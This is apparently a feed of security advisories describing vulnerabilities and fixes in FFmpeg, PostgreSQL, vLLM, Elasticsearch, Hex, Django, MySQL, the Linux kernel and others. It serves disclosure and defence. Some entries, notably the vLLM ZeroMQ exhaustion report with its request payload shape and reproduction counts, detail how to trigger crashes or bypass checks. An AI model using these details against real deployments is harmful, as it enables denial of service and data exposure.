FFmpeg before 9.1 contains an uninitialized memory use vulnerability in asfrtp_parse_packet() in libavformat/rtpdec_asf.c that allows malicious RTP sources to leak heap contents by supplying an oversized ASF packet length. Attackers controlling an RTSP server with an x-asf-pf payload can set len_off beyond the RTP payload so the ASF demuxer returns stale heap memory as demuxed media data.

FFmpeg before 9.1 contains an uninitialized memory vulnerability in nist_read_header() in libavformat/nistspheredec.c, where an inverted ff_alloc_extradata() return check leaves the embedded-shorten extradata byte uninitialized. Attackers can supply a crafted NIST SPHERE file declaring pcm,embedded-shorten coding to leak an uninitialized heap byte into copied output or trigger a NULL pointer write on allocation failure.

FFmpeg before 9.1 contains an uninitialized memory disclosure vulnerability in vmd_read_packet() in libavformat/sierravmd.c that leaves 16 packet bytes unwritten for Indeo3 frames. Attackers can supply a crafted VMD file with Indeo3 video to expose leftover heap contents in demuxed packets, such as stream-copied output files.

FFmpeg before 9.1 contains an XML injection vulnerability in ttml_write_header() in libavformat/ttmlenc.c that writes stream language metadata unescaped into the xml:lang attribute. Attackers can supply media files, such as Matroska subtitle tracks with crafted Language values, to inject markup into converted TTML documents and alter downstream parsing or rendering.

FFmpeg before 9.1 contains an information disclosure vulnerability in amf_get_field_value2() in libavformat/rtmppkt.c that NUL-terminates truncated AMF strings at the declared length instead of bytes read. A malicious RTMP server, or connecting client in listen mode, can send truncated onStatus or _error strings to leak uninitialized stack memory through log messages.

FFmpeg before 9.1 contains an uninitialized memory disclosure vulnerability in rfc4175_handle_packet() in libavformat/rtpdec_rfc4175.c that leaks heap contents into decoded video frames. Attackers can send RTP streams containing only some scan lines of a frame, leaving av_malloc buffer bytes uninitialized and exposing process heap memory in displayed, stored or re-streamed video.

FFmpeg before 9.1 contains an XML injection vulnerability in write_adaptation_set() in libavformat/webmdashenc.c that writes stream language metadata unescaped into the AdaptationSet lang attribute. Attackers can supply crafted WebM files whose track language contains quotes or angle brackets to inject attributes or elements, controlling segment URLs and representations in generated MPD manifests.

FFmpeg before 9.1 contains an uninitialized memory vulnerability in vpk_read_header() in libavformat/vpk.c that computes a last block size not divisible by the channel count. Attackers can supply a crafted VPK file with a large channel count so the last audio packet exposes leftover heap memory contents.

FFmpeg 6.1 through 9.0.2 contains an information disclosure vulnerability in the CamStudio decoder (libavcodec/cscd.c) that copies uninitialized heap memory into decoded frames when decompressed payloads are short. Attackers can supply a crafted AVI with a CSCD stream whose LZO or zlib frames decompress to fewer bytes than the frame size, recovering heap contents from the decoded or re-encoded output.
PostgreSQL Anonymizer doesn't mask data accessed thru a security_invoker view. The problem is resolved in PostgreSQL Anonymizer 3.3.0 and later versions.

ImageMagick before 6.9.13-58 and 7.x before 7.1.2-32 contains a security policy bypass caused by an incomplete fix for the policy bypass reported in GHSA-jjp4-3fwf-393j. An attacker able to supply input to ImageMagick can evade configured security policy restrictions, allowing operations the policy was intended to block.

items.title: Potential exposure of private data via empty and missing Vary headers
items.description:
An issue was discovered in Django 6.1 before 6.1.3, 6.0 before 6.0.10, and 5.2 before 5.2.19.
The `django.middleware.cache.UpdateCacheMiddleware` and the `django.views.decorators.cache.cache_page()` decorator generate identical cache keys for requests that omit a header listed in the response’s `Vary` header and requests that include that header with an empty value, potentially allowing remote attackers to access private data cached for another request.
Earlier, unsupported Django series (such as 5.1.x, 5.0.x, and 4.2.x) were not evaluated and may also be affected.
Django would like to thank Andrew Gonzalez for reporting this issue.

items.title: Bake filesystem path entitlements approval can be skipped for path using basename prefix
items.description: In Docker Buildx versions v0.19.0 through v0.38.0, an untrusted Bake definition may expose files accessible to the Buildx client without the expected fs.read approval. Under certain conditions, paths under the same parent directory as the current working directory whose names use the working directory's basename as a prefix can skip the filesystem entitlement check. Exploitation requires specific matching filenames next to the current project directory. Users who run untrusted Bake definitions may be affected. The issue is fixed in v0.38.1.

A denial of service vulnerability in Palo Alto Networks PAN-OS software enables an authenticated user with a read-only administrator role to cause a denial of service (DoS) condition by sending a specially crafted API request.

The security risk posed by this issue is significantly minimized by restricting access to the management web interface to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 .

Cloud NGFW, Panorama, and Prisma® Access are not affected by this vulnerability.

Chartbrew is an open-source web application that can connect directly to databases and APIs and use the data to create charts. In 5.2.2, the AI SQL blocklist omitted sibling PostgreSQL filesystem functions and failed to match double-quoted identifier forms of denied functions. The vulnerable surface is the AI query tool's PostgreSQL SQL-validation blocklist. A team Owner or Admin uses an AI-enabled PostgreSQL connection whose database role can call server-side file functions and causes generated SQL to use an unlisted sibling function or a double-quoted denied function. Unlisted sibling functions remain allowed, and double-quoted function identifiers bypass the denylist regular expressions and reach PostgreSQL. AI features must be enabled and the user must have elevated Chartbrew privileges. A PostgreSQL superuser or pg_read_server_files role can resolve absolute paths to files readable by the PostgreSQL OS user, while a non-superuser is limited to the source-stated PGDATA-relative scope. This vulnerability is fixed in 5.2.3.

Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in hexpm hex allows an untrusted package mirror to exhaust the memory or disk space of the machine running mix deps.get, mix deps.update, mix hex.package fetch or mix hex.docs fetch.

Hex treats a mirror configured with HEX_MIRROR_URL, HEX_MIRROR or mirror_url as untrusted: it doesn't send credentials to it, and it checks registry signatures and package checksums that the mirror can't forge. Several response paths consume memory or disk in proportion to what the mirror sends before any of those checks run.

Hex.HTTP.request/5 reads the whole response body into memory and decompresses it with :zlib.gunzip/1 whenever the response's Content-Encoding contains gzip, with no limit on the compressed or decompressed size. Hex doesn't ask for compressed responses, so the server decides whether this step runs. It applies to registry, package, docs and API responses.

Package tarballs have no download size limit. Hex 2.5.1 holds the whole tarball in memory and writes it to the cache, and the development branch streams it to a temporary file; the 16 MiB tarball limit is checked only when the file is unpacked. The tarball is then unpacked, into deps/<app> in 2.5.1 and into a staging directory on the development branch, before its checksums are compared with the registry.

mix hex.docs fetch, and mix hex.docs offline when docs are missing, write the docs tarball to disk and extract it with :mix_hex_erl_tar.extract/2 without the 16 MiB compressed and 128 MiB decompressed limits that mix_hex_tarball:unpack_docs/3 applies. The signed registry doesn't cover docs tarballs, so nothing checks them.

Registry responses are also decompressed before their signature is checked, in hex_core code that Hex vendors; that part is tracked in https://github.com/hexpm/hex_core/security/advisories/GHSA-7c4r-cgf9-9jmq.

This issue affects hex: from 0.11.2 before 2.5.2.

Improper Handling of Highly Compressed Data (Data Amplification) vulnerability in hexpm hex_core allows an untrusted repository mirror, or a server answering hex_core's API requests, to exhaust the memory of the Erlang VM running hex_core. The same code is vendored in Hex (mix_hex_repo, mix_hex_api) and rebar3 (r3_hex_repo, r3_hex_api).

hex_repo:get_names/1, hex_repo:get_versions/1, hex_repo:get_package/2 and hex_repo:get_policy/2 decompress the registry response with zlib:gunzip/1 and decode the signed envelope before verifying its signature. A mirror doesn't have the repository's private key, but it chooses the compressed bytes, so a small response decompresses into an envelope of any size before the signature check rejects it.

hex_api decodes responses with the application/vnd.hex+erlang content type through hex_safe_binary_to_term:safe_binary_to_term/1, which calls binary_to_term(Binary, [safe]). The safe option prevents atom creation, but it accepts compressed terms and doesn't limit the size of the decoded term, and the check that rejects functions and ports runs after the term has been built. The fix for CVE-2026-21619 added the safe option and that check without bounding the decoded size.

This issue affects rebar3: from 3.9.1 before 3.27.3; hex: from 2.1.0 before 2.5.2 and from 2.6.0 onward; hex_core: from 0.1.0 before 0.20.0.

A stored cross-site scripting (XSS) vulnerability in Palo Alto Networks PAN-OS® software enables a malicious authenticated administrator to store or execute a JavaScript payload using the web interface.



The security risk posed by this issue is minimized when the management interface is restricted to only trusted internal IP addresses according to our recommended  best practice deployment guidelines https://live.paloaltonetworks.com/t5/community-blogs/tips-amp-tricks-how-to-secure-the-management-access-of-your-palo/ba-p/464431 . 




This issue is applicable to PAN-OS® software on PA-Series and VM-Series firewalls and on Panorama (virtual and M-Series).



Cloud NGFW and Prisma® Access are not affected by these vulnerabilities.

vLLM is an inference and serving engine for large language models. From 0.11.1 until 0.32.0, the DeepSeek-OCR, DeepSeek-OCR-2, and Unlimited-OCR image path allows a remote client that can reach the OpenAI-compatible API to submit a legal image whose normalized pixels sum to zero when that image is alone in its per-step encoder batch. _parse_and_validate_image_input returns no embedding, embed_multimodal propagates that value, and sanity_check_mm_encoder_outputs triggers a fatal assertion that shuts down the engine for all users. This issue is fixed in version 0.32.0.

items.title: vllm p2p never connected zmq_exhaustion
items.description:
### Summary

When the `OffloadingConnector` uses `TieringOffloadingSpec` with a P2P secondary tier, an API client can submit many unique non-listening peer addresses through `kv_transfer_params.prefill`. vLLM keeps every never-established P2P session and its ZeroMQ sockets after the request finishes. On vLLM 0.26.0, 340 such peers filled the default ZeroMQ context socket quota; creating the next peer raised an uncaught `ZMQError`, terminated `EngineCore`, and shut down the API server. The path was reproduced with a normal API key and no access to the internal P2P listener.

### Details

#### Root cause

In vLLM 0.26.0, `P2PSecondaryTierManager.on_new_request()` reads the following request-controlled fields:

```json
{
  "kv_transfer_params": {
    "prefill": {
      "kv_request_id": "id",
      "remote_host": "127.0.0.1",
      "remote_port": 49101
    }
  }
}
```

`on_new_request()` calls `_get_or_create_session(peer_id)`. This calls `ZmqTransport.connect()`, creates a `P2PSession`, and stores it in `_sessions` before the asynchronous ZeroMQ connection has been established.

`ZmqTransport._open_connection()` creates a DEALER, enables a libzmq monitor, creates a PAIR socket for that monitor, calls `dealer.connect()`, and immediately stores the resulting `ZmqConnection` in `_connections`. Returning from `dealer.connect()` does not prove that the peer is reachable.

The monitor subscribes only to `zmq.EVENT_DISCONNECTED`. A peer that never accepts the initial connection produced `EVENT_CONNECT_DELAYED`, `EVENT_CONNECT_RETRIED`, and `EVENT_CLOSED`, but no `EVENT_DISCONNECTED` during a 60-second observation. The production monitor therefore never calls `mark_dead()`, and `ZmqConnection.alive` remains true.

Request completion calls `session.finish_request()`, but does not close or remove the peer session. The manager reaps only a session for which `session.connected and not session.alive` is true. A never-established peer remains `connected=True`, `alive=True`, and `ready=False`. There is no establishment deadline, idle eviction, or limit on pending or total peers.

Each unique retained peer uses about three sockets in the same ZeroMQ context: the DEALER, the monitor endpoint created by libzmq, and the PAIR monitor client. With the measured default `MAX_SOCKETS=1023`, 340 peers use approximately 1,020 sockets in addition to the local ROUTER. The next peer fails while creating its monitor PAIR. The exception escapes through `on_new_request()` and the scheduler into the EngineCore loop:

```text
P2PSecondaryTierManager._get_or_create_session()
  -> ZmqTransport.connect()
  -> ZmqTransport._open_connection()
  -> monitor_sock = self._zmq_ctx.socket(zmq.PAIR)
  -> zmq.error.ZMQError: Too many open files
  -> EngineDeadError
```

The process open-files limit was 65,536. The EngineCore had about 1,215 file descriptors at the failure point, so the failure was not the operating-system FD limit.

#### Boundary and controls

Each row below used a fresh vLLM process and pre-generated unique non-listening loopback ports.

| Test | Result |
|---|---|
| Default `MAX_SOCKETS=1023`, 340 unique peers | 340 HTTP 200 responses; 340 active peers; service healthy |
| Default limit, 344 unique peers, concurrency 4 | 340 HTTP 200 and 4 HTTP 500 responses; EngineCore and API exited |
| Default limit, 344 unique peers, concurrency 1 | Same 340-peer ceiling and service exit |
| Same endpoint repeated 512 times | 512 HTTP 200 responses; one active peer; service healthy |
| 512 requests without P2P parameters | 512 HTTP 200 responses; no active peers; service healthy |

A diagnostic A/B changed only the context `MAX_SOCKETS` value. Raising it from 1,023 to 2,048 moved the last fully successful point from 340 to 682 peers. The 683rd peer then raised the same `ZMQError` and terminated the service. The approximately 2.01x movement in the boundary identifies the ZeroMQ context quota as the exhausted resource.

The failure runs used logging-only instrumentation around `_open_connection()` to record the context limit, peer count, and process FD count. It did not add or close any ZeroMQ socket and re-raised the original exception.

#### Related public work

[PR #47843](https://github.com/vllm-project/vllm/pull/47843) is an open, unmerged proposal that identifies client-supplied P2P peer addresses as an SSRF risk and proposes API sanitization plus a configured peer allowlist. Those changes would block this public API trigger, but the PR does not add a connection deadline, session cleanup, or a capacity limit for never-established peers. This report adds the deterministic resource-exhaustion and service-exit impact of the retained state.

[PR #49823](https://github.com/vllm-project/vllm/pull/49823) fixes cleanup and reconnection after a connection has been marked dead. A peer that never establishes does not receive the subscribed `EVENT_DISCONNECTED` event, so it never enters that dead-state cleanup path.

### Impact

This is uncontrolled resource consumption leading to denial of service. An attacker needs network access to an OpenAI-compatible inference endpoint and a normal API key when `--api-key` is enabled. The attacker does not need access to the internal P2P control or data ports and does not need any peer to answer.

Only deployments that explicitly enable `OffloadingConnector`, `TieringOffloadingSpec`, and a P2P secondary tier are affected. Repeating a cheap one-token request with unique non-listening endpoints steadily consumes scheduler and ZeroMQ resources. In the tested default context, about 341 requests were enough to terminate EngineCore and stop all inference on the instance until restart. Confidentiality and integrity were not affected; the demonstrated impact is availability loss.

This advisory was fixed in [MR51504](https://github.com/vllm-project/vllm/pull/51504).

vLLM is an inference and serving engine for large language models. From 0.16.0 until 0.32.0, the /v1/responses endpoint allows an authenticated caller to place an attacker-controlled template in chat_template_kwargs[chat_template] when no server template is configured. ChatParams.get_apply_chat_template_kwargs() preserves that value without enforcing trust_request_chat_template, so the request can bypass the intended trust policy and cause CPU or memory exhaustion through Jinja rendering. This issue is fixed in version 0.32.0.

vLLM is an inference and serving engine for large language models. From 0.19.0 until 0.32.0, authenticated callers can supply a request chat template when no server-side --chat-template is configured, or a malicious model repository can provide a template that is compiled and rendered by tokenizer.apply_chat_template() without a wall-clock timeout, output-size limit, or iteration bound. Rendering runs in a ThreadPoolExecutor with one worker by default, so a nonterminating render can block /v1/responses and other chat-template users after the request ends, while an output-expanding render can exhaust server memory. Harmony models are not affected because they do not use this Jinja path. This issue is fixed in version 0.32.0.

vLLM is an inference and serving engine for large language models. Prior to 0.32.0, vllm/tokenizers/hf.py computes max_token_id with an off-by-one upper bound, allowing a pre-tokenized prompt ID equal to the vocabulary size to pass validation. For a tensor-parallel size of one and an exact multiple-of-64 vocabulary, VocabParallelEmbedding.forward does not mask that value before F.embedding uses it, causing a CUDA device-side assertion and terminating the engine. This issue is fixed in version 0.32.0.

items.title: /v1/systemone bypasses the --trust-request-chat-template gate
items.description:
### Summary

In affected vLLM releases, `POST /v1/systemone` accepted request-level `chat_template_kwargs` and passed them to the shared HF renderer without calling `validate_chat_template()`. This let callers provide a chat template even when the server’s default trust setting disallowed request-supplied templates.

### Details

The trust gate is OnlineRenderer.validate_chat_template(). It is invoked by the two callers (render_chat, render_responses), not by the shared renderer both of them call (preprocess_chat). /v1/systemone reaches preprocess_chat directly:

  StructuredDecisionRequest.chat_template_kwargs    protocol.py:42
  -> ServingStructuredDecisions.create_decision     serving.py:110
  -> NextTokenStrategy.read -> _read_request        strategies.py:261
  -> ReadPromptRequest.chat_template_kwargs         protocol.py:95
  -> OnlineRenderer.preprocess_chat                 online_renderer.py:752
  -> HfRenderer -> tokenizer.apply_chat_template(...)

In affected releases, the structured-decisions serving path did not call `validate_chat_template()`. The shared `preprocess_chat()` path does not perform template trust validation itself.

Registration is unconditional: launchers/api_server/routers.py:32 calls register_structured_decisions_api_router(app) with no flag, and launchers/app.py:45 reaches it from the normal app build path. The endpoint is also listed among the API-key-protected endpoints in docs/usage/security.md.

Scope: init_structured_decisions_state returns early (endpoint answers 501) when select_read_strategy() rejects the architecture, so this only affects models listed in READ_STRATEGIES (strategies.py:812) -- e.g. Qwen3ForCausalLM, Qwen3_5ForConditionalGeneration, Qwen3_5MoeForConditionalGeneration, Lfm2VlForConditionalGeneration, ClefOmniForJointSchema.

### Impact

A caller that can reach /v1/systemone controls how the conversation is serialized. The <|im_start|>system block, which an operator normally pins with --chat-template, can be replaced, and special tokens or turn boundaries that message-level validation would not allow can be injected. Default configuration is affected; no flag is needed.

To keep the report accurate, two limits:

- We are not claiming CPU/memory exhaustion. HfRenderer already bounds a single render with VLLM_CHAT_TEMPLATE_RENDER_TIMEOUT (30 s default, renderers/hf.py:992), and that guard is on this code path too.
- We have not tested whether the Jinja sandbox can be escaped, and are not claiming it can be.

We think this is best described as a protection-mechanism bypass: the gate is correct, it is simply not reached on this endpoint.

Reported by Haile Du (@revalue-o) and Yuan Luo (@leonnewton), BAAI (Beijing Academy of Artificial Intelligence).

### Affected and fixed versions

The issue affects vLLM 0.32.0rc0 through 0.33.0. Version 0.34.0 applies the template trust check before rendering structured-decision requests.

A fix for this was introduced in https://github.com/vllm-project/vllm/pull/64503.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Easily exploitable vulnerability allows high privileged attacker with logon to the infrastructure where MySQL Server, MySQL Cluster executes to compromise MySQL Server, MySQL Cluster.  Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.4 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H).

Elasticsearch ES|QL data-source and dataset registration can write storage credentials or pre-signed URL signatures to the audit log in plaintext. In affected versions, request definitions are not appropriately filtered before request-body or URL-query auditing. An attacker with access to these logs can obtain credentials for the customer's external storage. The issue affects deployments with ES|QL federation enabled and audit logging configured to record the affected request information.

Active Storage makes it simple to upload and reference files in cloud services and attach those files to Active Record objects. Prior to 8.1.4.1 and 8.0.5.2, ActiveStorage::Filename#base and #extension_with_delimiter, and therefore #extension, pass the stored filename unmodified to File.basename and File.extname, which raise ArgumentError when the name contains a NUL byte. Active Storage stores the client-supplied filename verbatim, so a user who is permitted to upload an attachment could persist such a filename on databases that accept NUL bytes in string columns, such as SQLite and MySQL/MariaDB. Each subsequent request that builds a variant or preview of the blob, opens it, or renders it as an Action Text attachment then raises, possibly resulting in a persistent DoS vulnerability for the pages that display the blob until it is purged or its filename is corrected. Applications that use PostgreSQL are not affected, because PostgreSQL rejects the row. This issue is fixed in versions 8.1.4.1 and 8.0.5.2.

vLLM before 0.33.0 contains a path traversal vulnerability that allows malicious model publishers to redirect the served model and tokenizer by setting speculators_config verifier.name_or_path in config.json. Attackers can point this field at another local checkpoint directory to leak its tokenizer vocabulary via unauthenticated /detokenize requests and gain query access to private models.

Buffer over-read in PostgreSQL dict_int allows a database user to disclose portions of server memory, via a zero-length token.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Use after free in PostgreSQL COPY FROM error reporting allows a database user to disclose portions of server memory, via a longer input row following an ignored or nullified conversion error.  file_fdw reaches the same code path in affected version 18.  Within major versions 17-18, minor versions before PostgreSQL 18.7 and 17.12 are affected.  Versions before PostgreSQL 17 are unaffected.

Improper null termination in PostgreSQL array element assignment allows a database user to disclose server memory, via changing the final byte of a fixed-length name value to a nonzero byte and passing it to code that treats the value as a C string.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Exposure of sensitive information in PostgreSQL security_barrier processing allows a database user to infer values hidden by a security_barrier view, via applying a leaky function to a CASE test value or internal parameter that indirectly represents a protected column.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Missing authorization in PostgreSQL REASSIGN OWNED allows a role granted INHERIT but not SET to transfer objects to the granted role.  It also allows reassignment of database ownership without the CREATEDB privilege.  The equivalent ALTER ... OWNER commands block this.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Use after free in PostgreSQL pg_show_all_settings() allows a database user to retrieve memory contents, via loading a module while the function is scanning custom-variable placeholders that the module replaces and frees.  Within major versions 16-18, minor versions before PostgreSQL 18.7, 17.12, and 16.16 are affected.  Versions before PostgreSQL 16 are unaffected.

Improper protection in PostgreSQL INSERT ... ON CONFLICT allows an attacker having INSERT, UPDATE, and applicable SELECT privileges on the table to read every row despite row security policies, via iterated INSERT ... ON CONFLICT DO UPDATE.  Unlike CVE-2026-16237, this does not facilitate improper writes.  Versions before PostgreSQL 18.7, 17.12, 16.16, 15.20, and 14.25 are affected.

Incorrect Authorization (CWE-863) in Elasticsearch can lead to information disclosure via Accessing Functionality Not Properly Constrained by ACLs (CAPEC-1). An authenticated user whose index access is restricted by field-level security can retrieve the value of a constant_keyword field that their role excludes. Some search and query features do not apply the field-level security restriction to this field type.

Vulnerability in Oracle TimesTen In-Memory Database (component: Kubernetes Operator).  Supported versions that are affected are 22.1-22.1.40.0 and  26.1-26.1.1.2.0. Easily exploitable vulnerability allows low privileged attacker with network access via HTTPS to compromise Oracle TimesTen In-Memory Database.  Successful attacks of this vulnerability can result in  unauthorized read access to a subset of Oracle TimesTen In-Memory Database accessible data. CVSS 3.1 Base Score 4.3 (Confidentiality impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N).

PostgreSQL Anonymizer contains a vulnerability related to the anon.partial() and anon.partial_email() functions. These function can reveal the while data if the data is small enough. The issue is fixed in PostgreSQL Anonymizer 3.3.0 and later versions.

PostgreSQL Anonymizer contains a vulnerability related to static masking and statistics persistence. Statistics pertaining to the original data remain visible in pg_stats until an ANALYZE operation is performed on the table, either manually or by autovacuum. This issue is fixed in PostgreSQL Anonymizer 3.3.0 and later versions.

Winter CMS is a content management system built on the Laravel PHP framework. From 1.2.13 until 1.2.14, the Backend\Controllers\MyAccount controller inherits the FormController actions create, update, and preview while declaring an empty $requiredPermissions array, and formFindModelObject() resolves a caller-supplied record identifier through an unscoped Backend\Models\User query. Any authenticated backend user can request another sequential user identifier through /backend/backend/myaccount/preview/{other_user_id} or the inherited update action and read profile data including name, login, email, avatar, role, group membership, superuser status, and throttle state. Password material is not exposed, and existing model authorization guards block cross-user writes. This issue is fixed in version 1.2.14.

items.title: djangocms-moderation: Moderation comments disclosed to non-participant staff via the admin changelist
items.description: djangocms-moderation provides an approval workflow mechanism for organizations that require content approval before publication. Prior to 2.4.0, CollectionCommentAdmin and RequestCommentAdmin in the Django admin use changelist_view and changeform_view to scope comment access through caller-controlled object identifiers and model-level view_collectioncomment or view_requestcomment permissions without invoking ModerationRequest.user_can_view_comments() or an equivalent collection participant check. An authenticated staff user with either view permission can enumerate collection or moderation-request identifiers and read full comment messages for workflows they do not participate in. The exposure affects confidentiality of internal editorial discussions; comment creation, modification, and deletion remain protected, and integrity and availability are unaffected. This issue is fixed in version 2.4.0.

django-filer is a file and image management application for Django. Prior to 3.5.0, the delete_files_or_folders action in filer/admin/folderadmin.py checks global Django model-level deletion permission but omits check_folder_edit_permissions and check_files_edit_permissions when FILER_ENABLE_PERMISSIONS is enabled. An authenticated staff user who has a global delete_file, delete_folder, or delete_image permission but is limited to read-only access by FolderPermission can therefore delete files, folders, and descendants from the restricted folder. Deployments using the default disabled per-folder permission system are not affected, and the issue does not create a read-confidentiality impact. This issue is fixed in version 3.5.0.

Incorrect authorization in Elasticsearch columnar indices can bypass field-level security for geo_shape values. An authenticated user with access to an affected index can obtain denied geometry values through the internal source-geometry representation even when field-level security excludes the corresponding field. This discloses field data that the user is not authorized to read.

Elasticsearch ES|QL query responses can disclose dataset storage locations and provider identity details to users who are allowed to query a dataset but cannot read its definition. Storage paths and storage-client error text can appear in read-failure messages or query-profile plan strings. An authenticated dataset reader can obtain this information without permission to view the dataset configuration. This issue does not disclose stored credentials or the dataset contents beyond the caller's query access.

Use of Cache Containing Sensitive Information (CWE-524) in Elasticsearch can lead to information disclosure and incorrect search results via specially crafted search requests. For some query types, Elasticsearch can share cached query results between users who have field-level security restrictions and users who do not. A user restricted by field-level security can learn which documents match a value in a field that they cannot read. A restricted user can also cause users with full access to receive incomplete search results. Disclosure is only possible when a user with full access ran the same query on the same shard recently.

The xmlwf tool in libexpat through 2.10.0 contains a symlink following vulnerability because -d output mode opens files with fopen("wb"), which follows symbolic links. Local attackers with write access to the output directory can plant a symlink at the expected output name to truncate or overwrite files writable by the xmlwf user.

Vulnerability in the MySQL Server, MySQL Cluster product of Oracle MySQL (component: InnoDB).  Supported versions that are affected are MySQL Server: 8.4.0-8.4.12, 9.7.0-9.7.3, 26.7.0-26.7.1; MySQL Cluster: 8.0.0-8.0.49, 8.4.0-8.4.12, 9.7.0-9.7.3 and  26.7.0-26.7.1. Difficult to exploit vulnerability allows high privileged attacker with logon to the infrastructure where MySQL Server, MySQL Cluster executes to compromise MySQL Server, MySQL Cluster.  Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a hang or frequently repeatable crash (complete DOS) of MySQL Server, MySQL Cluster. CVSS 3.1 Base Score 4.0 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:U/C:N/I:N/A:H).

vLLM is an inference and serving engine for large language models. Prior to 0.32.0, the OpenAI-compatible server configures Starlette CORSMiddleware with allowed_origins set to a wildcard by default. A malicious web page can use a victim's browser to reach an unauthenticated vLLM server on localhost, an internal network, or a VPN, call endpoints including GET /v1/models and POST /v1/chat/completions, consume GPU resources, and read responses. Cookie-based cross-site request forgery does not apply because credentials are disabled by default, and deployments requiring bearer authentication are exposed only when the caller already has a usable token. This issue is fixed in version 0.32.0.

vLLM from 0.19.0 before 0.31.0 contains a resource exhaustion vulnerability that allows inference clients to bypass the server frame limit by setting media_io_kwargs.video.num_frames in chat completion requests. Attackers can supply num_frames=-1 or a large value with many base64 JPEG frames, forcing VideoMediaIO to decode all frames and np.stack them, causing memory exhaustion.

Flexible GraphRAG is a Python framework for building graph and retrieval-augmented generation applications across multiple graph, vector, and search backends. From 0.6.0 until 0.8.2, the _escape() helper in flexible-graphrag/langchain/graph/pg_store_adapters/falkordb_adapter.py escapes quotes before backslashes and then interpolates the result into Cypher assembled by FalkorDBAdapter.add_graph_documents, allowing an inserted escape to be doubled and a quote to terminate the string early. When GRAPH_BACKEND=langchain and GRAPH_DB=falkordb are configured, attacker-influenced ingested document content can cause the extraction model to produce malicious entity or relationship values that reach these queries, allowing injected Cypher clauses to modify or delete graph data and, when the calling code surfaces query results to the user or LLM, disclose graph data. Dynamic node and relationship type identifiers are also inserted into backtick-quoted query positions without safe parameterization. The LlamaIndex FalkorDB store is not affected. This issue is fixed in version 0.8.2.

A flaw was found in libarchive. An attacker can cause a Denial of Service (DoS) or potential information disclosure due to a use-after-free vulnerability, which occurs when a program reads memory that has already been released. This issue arises when the archive_entry_copy_mac_metadata() function deallocates an internal buffer before completing a data copy. An attacker who can supply input to an application utilizing this function can trigger the flaw to crash the application or read uninitialized memory data.

In the Linux kernel, the following vulnerability has been resolved:

freevxfs: don't BUG() on unknown typed-extent type

vxfs_bmap_typed() handles four typed-extent types and calls BUG() in
its default case, so an on-disk typed extent with any other type value
crashes the kernel. It is reachable from ioctl(FIBMAP) on a regular
file:

  kernel BUG at fs/freevxfs/vxfs_bmap.c:230!
  RIP: vxfs_bmap_typed fs/freevxfs/vxfs_bmap.c:230 [inline]
       vxfs_bmap1+0x128a/0x12d0 fs/freevxfs/vxfs_bmap.c:257

Replace the BUG() with WARN_ON_ONCE() and return 0 -- the value
vxfs_bmap_typed() already returns on failure (and from the DEV4 case
above); vxfs_getblk() maps 0 to -EIO, so the ioctl fails cleanly.

In the Linux kernel, the following vulnerability has been resolved:

netfilter: nf_conntrack_expect: zero at allocation time

There are occasional LLM hints wrt. leaking uninitialized data to
userspace via ctnetlink.  Just zero at allocation time,
expectations are not frequently used these days.

Intentionally keeps _init as-is because we could theoretically
support re-init, so add the missing exp->dir there.

In the Linux kernel, the following vulnerability has been resolved:

wifi: iwlwifi: mld: don't WARN on WoWLAN suspend w/o netdetect

Clearly, from a user perspective, it must be valid to configure
WoWLAN and then suspend while not connected to a network. Since
mac80211 doesn't distinguish these cases and simply calls the
driver to suspend whenever WoWLAN is configured, the driver has
to cleanly handle the case where it's called for WoWLAN, it's
not connected but there's also no netdetect configured.

Remove the WARN_ON() and keep returning 1 to disconnect and
then suspend.

In the Linux kernel, the following vulnerability has been resolved:

drm/nouveau/gsp: add SEC2 to GA100 chip table

The booter-load and booter-unload firmware run on the SEC2 falcon.
During tu102_gsp_oneinit(), the booter constructor needs device->sec2
to access the SEC2 falcon.
